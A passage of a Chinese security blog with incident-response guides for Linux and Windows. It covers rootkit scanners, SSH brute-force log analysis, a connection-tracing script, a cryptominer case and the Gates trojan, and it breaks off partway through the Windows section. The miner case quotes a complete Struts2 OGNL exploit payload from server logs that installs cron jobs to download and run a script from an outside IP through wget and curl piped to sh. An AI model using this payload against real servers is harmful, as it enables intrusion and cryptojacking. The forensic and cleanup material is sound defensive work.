-lJul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</code></pre><h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><h4 id="一、Rootkit-查杀"><a href="#一、Rootkit-查杀" class="headerlink" title="一、Rootkit 查杀"></a>一、<code>Rootkit</code> 查杀</h4><pre><code>chkrootkit :http://www.chkrootkit.org </code></pre><h5 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h5><pre><code>wgetftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gztar zxvf chkrootkit.tar.gzcdchkrootkit-0.52makesense#编译完成没有报错的话执行检查./chkrootkit</code></pre><h4 id="二、rkhunter"><a href="#二、rkhunter" class="headerlink" title="二、rkhunter"></a>二、<code>rkhunter</code></h4><pre><code>rkhunterhttp://rkhunter.sourceforge.net</code></pre><h5 id="使用方法：-1"><a href="#使用方法：-1" class="headerlink" title="使用方法："></a>使用方法：</h5><pre><code>Wget https://nchc.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.4/rkhunter-1.4.4.tar.gztar -zxvfrkhunter-1.4.4.tar.gzcdrkhunter-1.4.4./installer.sh --installrkhunter -c</code></pre><h3 id="二、病毒查杀"><a href="#二、病毒查杀" class="headerlink" title="二、病毒查杀"></a>二、病毒查杀</h3><h4 id="三、Clamav"><a href="#三、Clamav" class="headerlink" title="三、Clamav"></a>三、<code>Clamav</code></h4><pre><code>ClamAV 的官方下载地址为：http://www.clamav.net/download.html</code></pre><h5 id="安装方式一："><a href="#安装方式一：" class="headerlink" title="安装方式一："></a>安装方式一：</h5><p>1、安装 <code>zlib</code>：</p><pre><code>wgethttp://nchc.dl.sourceforge.net/project/libpng/zlib/1.2.7/zlib-1.2.7.tar.gz tar -zxvfzlib-1.2.7.tar.gzcdzlib-1.2.7#安装一下gcc编译环境： yum install gccCFLAGS=&quot;-O3 -fPIC&quot;./configure --prefix=/usr/local/zlib/make&amp;&amp; makeinstall</code></pre><p>2、添加用户组 <code>clamav</code> 和组成员 <code>clamav</code>：</p><pre><code>groupadd clamavuseradd -gclamav -s/bin/false -c&quot;Clam AntiVirus&quot;clamav</code></pre><p>3、安装 <code>Clamav</code></p><pre><code>tar –zxvf clamav-0.97.6.tar.gzcdclamav-0.97.6./configure --prefix=/opt/clamav --disable-clamav-with-zlib=/usr/local/zlibmakemakeinstall</code></pre><p>4、配置 <code>Clamav</code></p><pre><code>mkdir/opt/clamav/logsmkdir/opt/clamav/updatatouch/opt/clamav/logs/freshclam.logtouch/opt/clamav/logs/clamd.logcd/opt/clamav/logschownclamav:clamav clamd.logchownclamav:clamav freshclam.log</code></pre><p>5、<code>ClamAV</code> 使用：</p><pre><code>/opt/clamav/bin/freshclam 升级病毒库./clamscan –h 查看相应的帮助信息./clamscan -r /home  扫描所有用户的主目录就使用./clamscan -r --bell -i /bin  扫描 bin 目录并且显示有问题的文件的扫描结果</code></pre><p>安装方式二： </p><pre><code>#安装yum install -yclamav#更新病毒库freshclam#扫描方法clamscan -r/etc --max-dir-recursion=5-l/root/etcclamav.logclamscan -r/bin --max-dir-recursion=5-l/root/binclamav.logclamscan -r/usr --max-dir-recursion=5-l/root/usrclamav.log#扫描并杀毒clamscan -r --remove/usr/bin/bsd-portclamscan -r --remove/usr/bin/clamscan -r--remove/usr/local/zabbix/sbin#查看日志发现cat/root/usrclamav.log |grep FOUND</code></pre><h4 id="四、webshell-查杀"><a href="#四、webshell-查杀" class="headerlink" title="四、webshell 查杀"></a>四、<code>webshell</code> 查杀</h4><p><code>linux</code> 版：</p><p>河马 <code>webshell</code> 查杀：</p><pre><code>http://www.shellpub.com</code></pre><p>深信服 <code>Webshell</code> 网站后门检测工具：</p><pre><code>http://edr.sangfor.com.cn/backdoor_detection.html</code></pre><h4 id="五、RPM-check-检查"><a href="#五、RPM-check-检查" class="headerlink" title="五、RPM check 检查"></a>五、<code>RPM check</code> 检查</h4><p>系统完整性可以通过 <code>rpm</code> 自带的 <code>-Va</code> 来校验检查所有的 <code>rpm</code> 软件包，查看哪些命令是否被替换了：</p><pre><code>./rpm -Va &gt; rpm.log</code></pre><p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是 8 位长字符串，每个字符都用以表示文件与 RPM 数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。</p><p>验证内容中的 8 个信息的具体内容如下：</p><pre><code>S文件大小是否改变M文件的类型或文件的权限（rwx）是否被改变5文件 MD5 校验是否改变（可以看成文件内容是否改变）D设备中，从代码是否改变L文件路径是否改变U文件的属主（所有者）是否改变G文件的属组是否改变T文件的修改时间是否改变如果命令被替换了，如何还原回来：文件提取还原案例：rpm  -qf /bin/ls  查询ls命令属于哪个软件包mv  /bin/ls /tmp  先把 ls 转移到 tmp 目录下，造成 ls 命令丢失的假象rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取 rpm 包中 ls 命令到当前目录的 /bin/ls 下cp /root/bin/ls  /bin/ 把 ls 命令复制到 /bin/ 目录 修复文件丢失</code></pre><h2 id="实战1-SSH异常"><a href="#实战1-SSH异常" class="headerlink" title="实战1 - SSH异常"></a>实战1 - <code>SSH</code>异常</h2><h3 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h3><blockquote><p>SSH 端口异常，我们首先有必要先来了解一下系统账号情况</p></blockquote><h4 id="A、系统账号情况"><a href="#A、系统账号情况" class="headerlink" title="A、系统账号情况"></a>A、系统账号情况</h4><p>1、除 <code>root</code> 之外，是否还有其它特权用户 (<code>uid</code>  为 0)</p><pre><code>[root@localhost ~]# awk -F: &#39;$3==0{print $1}&#39; /etc/passwdroot</code></pre><p>2、可以远程登录的帐号信息</p><pre><code>[root@localhost ~]# awk &#39;/$1|$6/{print $1}&#39; /etc/shadowroot:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7:::</code></pre><p>我们可以确认目前系统只有一个管理用户 root。</p><p>接下来，我们想到的是 <code>/var/log/secure</code>，这个日志文件记录了验证和授权方面的信息，只要涉及账号和密码的程序都会记录下来。</p><h4 id="B、确认攻击情况"><a href="#B、确认攻击情况" class="headerlink" title="B、确认攻击情况"></a>B、确认攻击情况</h4><p>1、统计了下日志，发现大约有 <code>126254</code> 次登录失败的记录，确认服务器遭受暴力破解</p><pre><code>[root@localhost ~]# grep -o &quot;Failed password&quot; /var/log/secure|uniq -c     126254 Failed password</code></pre><p>2、输出登录爆破的第一行和最后一行，确认爆破时间范围</p><pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|head -1Jul  8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|tail -1Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2</code></pre><p>3、进一步定位有哪些 <code>IP</code> 在爆破</p><pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c | sort -nr     12622 23.91.xxx.xxx     8942 114.104.xxx.xxx     8122 111.13.xxx.xxx     7525 123.59.xxx.xxx     ...................</code></pre><p>4、爆破用户名字典都有哪些？</p><pre><code>[root@localhost ~]# grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr      9402  root      3265  invalid user oracle      1245  invalid user admin      1025  invalid user user      .....................</code></pre><h4 id="C、管理员最近登录情况："><a href="#C、管理员最近登录情况：" class="headerlink" title="C、管理员最近登录情况："></a>C、管理员最近登录情况：</h4><p>1、登录成功的日期、用户名、<code>IP</code></p><pre><code>[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39; Jul 9 09:38:09 root 192.168.143.100Jul 9 14:55:51 root 192.168.143.100Jul 10 08:54:26 root 192.168.143.100Jul 10 16:25:59 root 192.168.143.100............................</code></pre><p>通过登录日志分析，并未发现异常登录时间和登录<code>IP</code>。</p><p>2、顺便统计一下登录成功的 <code>IP</code> 有哪些</p><pre><code>[root@localhost ~]# grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more     27 192.168.204.1</code></pre><p>通过日志分析，发现攻击者使用了大量的用户名进行暴力破解，但从近段时间的系统管理员登录记录来看，并未发现异常登录的情况，需要进一步对网站服务器进行入侵排查，这里就不再阐述。</p><h3 id="处理措施"><a href="#处理措施" class="headerlink" title="处理措施"></a>处理措施</h3><p><code>SSH</code>暴力破解依然十分普遍，如何保护服务器不受暴力破解攻击，总结了几种措施：</p><ol><li><p>禁止向公网开放管理端口，若必须开放应限定管理 IP 地址并加强口令安全审计（口令长度不低于 8 位，由数字、大小写字母、特殊字符等至少两种以上组合构成）。</p></li><li><p>更改服务器 ssh 默认端口。</p></li><li><p>部署入侵检测设备，增强安全防护。</p></li></ol><h2 id="应急响应实战之短连接"><a href="#应急响应实战之短连接" class="headerlink" title="应急响应实战之短连接"></a>应急响应实战之短连接</h2><p>短连接（<code>short connnection</code>）是相对于长连接而言的概念，指的是在数据传送过程中，只在需要发送数据时，才去建立一个连接，数据发送完成后，则断开此连接，即每次连接只完成一项业务的发送。 在系统维护中，一般很难去察觉，需要借助网络安全设备或者抓包分析，才能够去发现。</p><h3 id="应急场景"><a href="#应急场景" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，网络管理员在出口 <code>WAF</code> 检测到某台服务器不断向香港<code>I</code>发起请求 ，感觉很奇怪，登录服务器排查，想要找到发起短连接的进程。</p><h3 id="日志分析-1"><a href="#日志分析-1" class="headerlink" title="日志分析"></a>日志分析</h3><p>登录服务器查看端口、进程，并未发现发现服务器异常，但是当多次刷新端口连接时，可以查看该连接。 有时候一直刷这条命令好十几次才会出现，像这种的短连接极难捕捉到对应的进程和源文件。 </p><p><img src="http://static.zybuluo.com/1kbfree/dl7hwlpecam9vnn0xpcpe6m2/image_1dauf89vvji28d91gh51mcm1duseb.png" alt="image_1dauf89vvji28d91gh51mcm1duseb.png-374.4kB"></p><p>手动捕捉估计没戏，很难追踪，于是动手写了一段小脚本来捕捉短连接对应的pid和源文件。</p><p>脚本文件如下：</p><pre><code>#!/bin/baship=118.184.15.40i=1while:do  tmp=netstat -anplt|grep $ip|awk -F&#39;[/]&#39;&#39;{print $1}&#39;|awk &#39;{print $7}&#39;  #echo $tmp  iftest -z&quot;$tmp&quot;  then      ((i=i+1))   else      forpid in$tmp; do          echo&quot;PID: &quot;${pid}         result=`ls -lh /proc/$pid|grep exe`         echo&quot;Process: &quot;${result}         kill-9$pid      done      break  fidoneecho&quot;Total number of times: &quot;${i}</code></pre><p>运行结果如下： </p><p><img src="http://static.zybuluo.com/1kbfree/xbqkui0c3timppktswptvz75/image_1daufb8d71ii11v7imge1isq1tqveo.png" alt="image_1daufb8d71ii11v7imge1isq1tqveo.png-21.6kB"></p><p>跑了三次脚本，可以发现短连接每次发起的进程 <code>Pid</code> 一直在变，但已经捕捉到发起该异常连接的进程源文件为 <code>/usr/lib/nfsiod</code></p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文简单介绍了短连接以及捕捉短连接源文件的技巧，站在安全管理员的角度，应加强对网络安全设备的管理，在网络层去发现更多在系统层很难察觉的安全威胁。</p><h2 id="应急响应实战之挖矿病毒"><a href="#应急响应实战之挖矿病毒" class="headerlink" title="应急响应实战之挖矿病毒"></a>应急响应实战之挖矿病毒</h2><p>随着虚拟货币的疯狂炒作，利用挖矿脚本来实现流量变现，使得挖矿病毒成为不法分子利用最为频繁的攻击方式。新的挖矿攻击展现出了类似蠕虫的行为，并结合了高级攻击技术，以增加对目标服务器感染的成功率，通过利用永恒之蓝（<code>EternalBlue</code>）、<code>web</code> 攻击多种漏洞（如 <code>Tomcat</code> 弱口令攻击、<code>Weblogic WLS</code> 组件漏洞、<code>Jboss</code> 反序列化漏洞、<code>Struts2</code> 远程命令执行等），导致大量服务器被感染挖矿程序的现象 。</p><h3 id="应急场景-1"><a href="#应急场景-1" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，安全管理员在登录安全设备巡检时，发现某台网站服务器持续向境外IP发起连接，下载病毒源：</p><p><img src="http://static.zybuluo.com/1kbfree/0pofgk2v3kypi2rucc8457rc/image_1daugme8rmg4cmpi0212mp4odf5.png" alt="image_1daugme8rmg4cmpi0212mp4odf5.png-349.8kB"></p><h3 id="事件分析"><a href="#事件分析" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="A、排查过程"><a href="#A、排查过程" class="headerlink" title="A、排查过程"></a>A、排查过程</h4><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 </p><p><img src="http://static.zybuluo.com/1kbfree/ep5z9rq8pkl2k89ksu7sh1rs/image_1daugogrf1d2h1lbocp1g3p1ijefi.png" alt="image_1daugogrf1d2h1lbocp1g3p1ijefi.png-92.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/weqpm9ohz2kw9kox0iti3sd6/image_1daugpfq61iekbp1rs4iccqjrfv.png" alt="image_1daugpfq61iekbp1rs4iccqjrfv.png-143.7kB"></p><p>下载 <code>logo.jpg</code>，包含脚本内容如下</p><p><img src="http://static.zybuluo.com/1kbfree/7ux7nwnv9mwyix5fdln5ccq4/image_1daugtgppuss1kd8a1h1p5s1eumgc.png" alt="image_1daugtgppuss1kd8a1h1p5s1eumgc.png-391.2kB"></p><p>到这里，我们可以发现攻击者下载 <code>logo.jpg</code> 并执行了里面了 <code>shell</code> 脚本，那这个脚本是如何启动的呢？</p><p><strong>通过排查系统开机启动项、定时任务、服务等，在定时任务里面，发现了恶意脚本，每隔一段时间发起请求下载病毒源，并执行 。</strong></p><p><img src="http://static.zybuluo.com/1kbfree/wytry3ayvhlfwq8qfevhoep8/image_1daugvc5o13eipur1rsbklq1aeigp.png" alt="image_1daugvc5o13eipur1rsbklq1aeigp.png-188.8kB"></p><h4 id="B、溯源分析"><a href="#B、溯源分析" class="headerlink" title="B、溯源分析"></a>B、溯源分析</h4><p>在 <code>Tomcat log</code> 日志中，我们找到这样一条记录</p><p><img src="http://static.zybuluo.com/1kbfree/f1u9q5gfz5871x2huystcpab/image_1dauh2ganpnnfd7h0mljac27h6.png" alt="image_1dauh2ganpnnfd7h0mljac27h6.png-156.4kB"></p><p>对日志中攻击源码进行摘录如下</p><pre><code>{(#_=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;echo &quot;*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh&quot; | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</code></pre><p>可以发现攻击代码中的操作与定时任务中异常脚本一致，据此推断黑客通过 <code>Struct</code> 远程命令执行漏洞向服务器定时任务中写入恶意脚本并执行。</p><h4 id="C、清除病毒"><a href="#C、清除病毒" class="headerlink" title="C、清除病毒"></a>C、清除病毒</h4><p>1、删除定时任务</p><p><img src="http://static.zybuluo.com/1kbfree/mdouj9c1elcy0yf09m3f7vg3/image_1dauh5q2r1jfqhl7fjd1d261aq0hj.png" alt="image_1dauh5q2r1jfqhl7fjd1d261aq0hj.png-226.9kB"></p><p>2、终止异常进程</p><p><img src="http://static.zybuluo.com/1kbfree/yt7f3n6atq6x9dhnv0nvj5p3/image_1dauh6bk4196j1clkt8u1e0d2hsi0.png" alt="image_1dauh6bk4196j1clkt8u1e0d2hsi0.png-101.2kB"></p><h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><p>针对服务器被感染挖矿程序的现象，总结了几种预防措施：</p><p>1、安装安全软件并升级病毒库，定期全盘扫描，保持实时防护</p><p>2、及时更新 <code>Windows</code> 安全补丁，开启防火墙临时关闭端口</p><p>3、及时更新 <code>web</code> 漏洞补丁，升级 <code>web</code> 组件</p><h2 id="应急响应实战之盖茨木马"><a href="#应急响应实战之盖茨木马" class="headerlink" title="应急响应实战之盖茨木马"></a>应急响应实战之盖茨木马</h2><p><code>Linux</code> 盖茨木马是一类有着丰富历史，隐藏手法巧妙，网络攻击行为显著的 <code>DDoS</code> 木马，主要恶意特点是具备了后门程序，<code>DDoS</code> 攻击的能力，并且会替换常用的系统文件进行伪装。木马得名于其在变量函数的命名中，大量使用 <code>Gates</code> 这个单词。分析和清除盖茨木马的过程，可以发现有很多值得去学习和借鉴的地方。</p><h3 id="应急场景-2"><a href="#应急场景-2" class="headerlink" title="应急场景"></a>应急场景</h3><p>某天，网站管理员发现服务器 CPU 资源异常，几个异常进程占用大量网络带宽：</p><p><img src="http://static.zybuluo.com/1kbfree/twv34jhjj48bxu1h19fxcdse/image_1dauhda2n17c41qgd14ao2l21cpid.png" alt="image_1dauhda2n17c41qgd14ao2l21cpid.png-436.6kB"></p><h3 id="事件分析-1"><a href="#事件分析-1" class="headerlink" title="事件分析"></a>事件分析</h3><h4 id="异常-IP-连接"><a href="#异常-IP-连接" class="headerlink" title="异常 IP 连接"></a>异常 <code>IP</code> 连接</h4><p><img src="http://static.zybuluo.com/1kbfree/cvdt4sgmqwdgxt77nrvccrtu/image_1dauhe6qr15t4kh21g2j1clf749iq.png" alt="image_1dauhe6qr15t4kh21g2j1clf749iq.png-188.5kB"></p><h4 id="异常进程"><a href="#异常进程" class="headerlink" title="异常进程"></a>异常进程</h4><p>查看进行发现 <code>ps aux</code> 进程异常，进入该目录发现多个命令，猜测命令可能已被替换</p><p>登录服务器，查看系统进程状态，发现不规则命名的异常进程、异常下载进程 </p><p><img src="http://static.zybuluo.com/1kbfree/07omz385idgmzq2faf7uii6e/image_1dauhkmjd16r51d9h1chrbt11bhmj7.png" alt="image_1dauhkmjd16r51d9h1chrbt11bhmj7.png-377.9kB"></p><h4 id="异常启动项"><a href="#异常启动项" class="headerlink" title="异常启动项"></a>异常启动项</h4><p>进入<code>rc3.d</code>目录可以发现多个异常进行：</p><pre><code>/etc/rc.d/rc3.d/S97DbSecuritySpt/etc/rc.d/rc3.d/S99selinux</code></pre><p><img src="http://static.zybuluo.com/1kbfree/z7lcihp9ty3ekltcobuti8pp/image_1dauhn4jn8jev43bh1bcvnjijk.png" alt="image_1dauhn4jn8jev43bh1bcvnjijk.png-204.4kB"></p><p><img src="http://static.zybuluo.com/1kbfree/peloafmxfmzegxtsqus5785r/image_1dauhnpr5119th7s1c7f1egpgupkd.png" alt="image_1dauhnpr5119th7s1c7f1egpgupkd.png-116.5kB"></p><h4 id="搜索病毒原体"><a href="#搜索病毒原体" class="headerlink" title="搜索病毒原体"></a>搜索病毒原体</h4><pre><code>find / -size -1223124c -size +1223122c -exec ls -id {} \;   搜索 1223123 大小的文件 </code></pre><p>从以上种种行为发现该病毒与“盖茨木马”有点类似，具体技术分析细节详见：</p><p><code>Linux</code>平台“盖茨木马”分析</p><p><a href="http://www.freebuf.com/articles/system/117823.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/system/117823.html</a></p><p>悬镜服务器卫士丨<code>Linux</code>平台“盖茨木马”分析</p><p><a href="http://www.sohu.com/a/117926079_515168" target="_blank" rel="noopener">http://www.sohu.com/a/117926079_515168</a></p><h4 id="手动清除木马过程："><a href="#手动清除木马过程：" class="headerlink" title="手动清除木马过程："></a>手动清除木马过程：</h4><p>1、简单判断有无木马</p><pre><code>#有无下列文件cat/etc/rc.d/init.d/selinuxcat/etc/rc.d/init.d/DbSecuritySptls/usr/bin/bsd-portls/usr/bin/dpkgd#查看大小是否正常ls-lh/bin/netstatls-lh/bin/psls-lh/usr/sbin/lsofls-lh/usr/sbin/ss</code></pre><p>2、上传如下命令到 <code>/root</code> 下</p><pre><code>ps netstat ss lsof</code></pre><p>3、删除如下目录及文件</p><pre><code>rm-rf/usr/bin/dpkgd (ps netstat lsof ss)rm-rf/usr/bin/bsd-port     #木马程序rm-f/usr/bin/.sshd         #木马后门rm-f/tmp/gates.lodrm-f/tmp/moni.lodrm-f/etc/rc.d/init.d/DbSecuritySpt(启动上述描述的那些木马变种程序)rm-f/etc/rc.d/rc1.d/S97DbSecuritySptrm-f/etc/rc.d/rc2.d/S97DbSecuritySptrm-f/etc/rc.d/rc3.d/S97DbSecuritySptrm-f/etc/rc.d/rc4.d/S97DbSecuritySptrm-f/etc/rc.d/rc5.d/S97DbSecuritySptrm-f/etc/rc.d/init.d/selinux(默认是启动/usr/bin/bsd-port/getty)rm-f/etc/rc.d/rc1.d/S99selinuxrm-f/etc/rc.d/rc2.d/S99selinuxrm-f/etc/rc.d/rc3.d/S99selinuxrm-f/etc/rc.d/rc4.d/S99selinuxrm-f/etc/rc.d/rc5.d/S99selinux</code></pre><p>4、找出异常程序并杀死</p><p>5、删除含木马命令并重新安装</p><h3 id="命令替换"><a href="#命令替换" class="headerlink" title="命令替换"></a>命令替换</h3><h4 id="RPM-check-检查"><a href="#RPM-check-检查" class="headerlink" title="RPM check 检查"></a><code>RPM check</code> 检查</h4><p>系统完整性也可以通过 <code>rpm</code> 自带的 <code>-Va</code> 来校验检查所有的 <code>rpm</code> 软件包,有哪些被篡改了,防止 <code>rpm</code> 也被替换,上传一个安全干净稳定版本 <code>rpm</code> 二进制到服务器上进行检查</p><pre><code>./rpm -Va &gt; rpm.log</code></pre><p>如果一切均校验正常将不会产生任何输出。如果有不一致的地方，就会显示出来。输出格式是8位长字符串, <code>c</code> 用以指配置文件, 接着是文件名. 8 位字符的每一个 用以表示文件与 <code>RPM</code> 数据库中一种属性的比较结果 。. (点) 表示测试通过。.下面的字符表示对 <code>RPM</code> 软件包进行的某种测试失败：</p><h4 id="命令替换-1"><a href="#命令替换-1" class="headerlink" title="命令替换"></a>命令替换</h4><pre><code>rpm2cpio 包全名 |  cpio -idv .文件绝对路径   rpm 包中文件提取Rpm2cpio  将 rpm 包转换为 cpio 格式的命令 Cpio 是一个标准工具，它用于创建软件档案文件和从档案文件中提取文件Cpio 选项 &lt; [文件|设备]-i：copy-in 模式，还原-d：还原时自动新建目录-v：显示还原过程</code></pre><h4 id="文件提取还原案例"><a href="#文件提取还原案例" class="headerlink" title="文件提取还原案例"></a>文件提取还原案例</h4><p>查询<code>ls</code>命令属于哪个软件包</p><pre><code>rpm  -qf /bin/ls  mv  /bin/ls /tmp  </code></pre><p>提取<code>rpm</code>包中<code>ls</code>命令到当前目录的 <code>/bin/ls</code> 下</p><pre><code>rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls</code></pre><p>把 <code>ls</code> 命令复制到 <code>/bin/</code> 目录 修复文件丢失:</p><pre><code>cp /root/bin/ls  /bin/ </code></pre><p>挂载命令 <code>rpm</code> 包：</p><pre><code>mkdir  /mnt/chrom/  建立挂载点mount -t iso9660 /dev/cdrom  /mnt/cdrom/  挂在光盘mount/dev/sr0 /mnt/cdrom/</code></pre><p>卸载命令</p><pre><code>umount  设备文件名或挂载点umount /mnt/cdrom/</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Window应急响应</title>
      <link href="/2019/05/23/window-ying-ji-xiang-ying/"/>
      <url>/2019/05/23/window-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<h2 id="排查方法"><a href="#排查方法" class="headerlink" title="排查方法"></a>排查方法</h2><h4 id="1-开机启动项是否存在异常文件"><a href="#1-开机启动项是否存在异常文件" class="headerlink" title="1. 开机启动项是否存在异常文件"></a>1. 开机启动项是否存在异常文件</h4><h4 id="2-浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息"><a href="#2-浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息" class="headerlink" title="2. 浏览器浏览痕迹、浏览器下载文件、浏览器cookie信息"></a>2. 浏览器浏览痕迹、浏览器下载文件、浏览器<code>cookie</code>信息</h4><h4 id="3-各个盘下的temp相关目录下查看有无异常文件"><a href="#3-各个盘下的temp相关目录下查看有无异常文件" class="headerlink" title="3. 各个盘下的temp相关目录下查看有无异常文件"></a>3. 各个盘下的<code>temp</code>相关目录下查看有无异常文件</h4><h4 id="4-通过对文件右键属性即可看到详细的时间（修改时间在创建时间之前明显是可疑文件）"><a href="#4-通过对文件右键属性即可看到详细的时间（修改时间在创建时间之前明显是可疑文件）" class="headerlink" title="4. 通过对文件右键属性即可看到详细的时间（修改时间在创建时间之前明显是可疑文件）"></a>4. 通过对文件右键属性即可看到详细的时间（修改时间在创建时间之前明显是可疑文件）</h4><h4 id="5-查看用户recent相关文件，通过分析最近打开分析可疑文件"><a href="#5-查看用户recent相关文件，通过分析最近打开分析可疑文件" class="headerlink" title="5. 查看用户recent相关文件，通过分析最近打开分析可疑文件"></a>5. 查看用户<code>recent</code>相关文件，通过分析最近打开分析可疑文件</h4><h4 id="6-看最新创建的文件来查找可疑文件"><a href="#6-看最新创建的文件来查找可疑文件" class="headerlink" title="6. 看最新创建的文件来查找可疑文件"></a>6. 看最新创建的文件来查找可疑文件</h4><p><img src="http://static.zybuluo.com/1kbfree/w87rf67w9im9rrq3yoijbmmu/image_1db0vh6sdikt8m13vq101516vf9.png" alt="image_1db0vh6sdikt8m13vq101516vf9.png-60.5kB"></p><h4 id="7-关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字"><a href="#7-关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字" class="headerlink" title="7. 关键字匹配，通过确定后的入侵时间，以及webshell或js文件的关键字"></a>7. 关键字匹配，通过确定后的入侵时间，以及<code>webshell</code>或<code>js</code>文件的关键字</h4><p><img src="http://static.zybuluo.com/1kbfree/eqapaw19wunayh7gqv4t0723/image_1db0vtrurlo318i61tg31uir1vplm.png" alt="image_1db0vtrurlo318i61tg31uir1vplm.png-194.8kB"></p><pre><code>findstr /s /i &quot;eval($_&quot; *.php查找所有*.php文件中存在&quot;eval($_&quot;的内容</code></pre><h4 id="8-进程命令"><a href="#8-进程命令" class="headerlink" title="8. 进程命令"></a>8. 进程命令</h4><p>查看目前的网络连接，定位可疑的<code>ESTABLISHED</code>(<code>tcp</code>连接成功)</p><pre><code>netstat -ano | findstr ESTABLISHED</code></pre><p>然后根据进程查看可以的<code>pid</code>然后使用<code>tasklist</code><br><a href="https://blog.csdn.net/wanlixingzhe/article/details/7181165" target="_blank" rel="noopener">https://blog.csdn.net/wanlixingzhe/article/details/7181165</a></p><blockquote><p>小技巧：可以下载火绒来用他们的进程查看，有很详细的内容</p></blockquote><h4 id="9-系统信息"><a href="#9-系统信息" class="headerlink" title="9. 系统信息"></a>9. 系统信息</h4><p>使用<code>set</code>命令查看变量的设置</p><p><code>Windows</code> 的计划任务；</p><p><code>Windows</code> 的帐号信息，如隐藏帐号等</p><p>配套的注册表信息检索查看，<code>SAM</code>文件以及远控软件类</p><p>查看<code>systeminfo</code> 信息，系统版本以及补丁信息</p><p>例如系统的远程命令执行漏洞<code>MS08-067、MS09-001、MS17-010</code>（永恒之蓝）…</p><p>若进行漏洞比对，建议使用<code>Windows-Exploit-Suggester</code></p><p><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester/</a></p><h4 id="10-后门排查"><a href="#10-后门排查" class="headerlink" title="10. 后门排查"></a>10. 后门排查</h4><p>PC Hunter是一个Windows系统信息查看软件</p><p><a href="http://www.xuetr.com/" target="_blank" rel="noopener">http://www.xuetr.com/</a></p><p>功能列表如下：</p><pre><code>1.进程、线程、进程模块、进程窗口、进程内存信息查看，杀进程、杀线程、卸载模块等功能2.内核驱动模块查看，支持内核驱动模块的内存拷贝3.SSDT、Shadow SSDT、FSD、KBD、TCPIP、Classpnp、Atapi、Acpi、SCSI、IDT、GDT信息查看，并能检测和恢复ssdt hook和inline hook4.CreateProcess、CreateThread、LoadImage、CmpCallback、BugCheckCallback、Shutdown、Lego等Notify Routine信息查看，并支持对这些Notify Routine的删除5.端口信息查看，目前不支持2000系统6.查看消息钩子7.内核模块的iat、eat、inline hook、patches检测和恢复8.磁盘、卷、键盘、网络层等过滤驱动检测，并支持删除9.注册表编辑10.进程iat、eat、inline 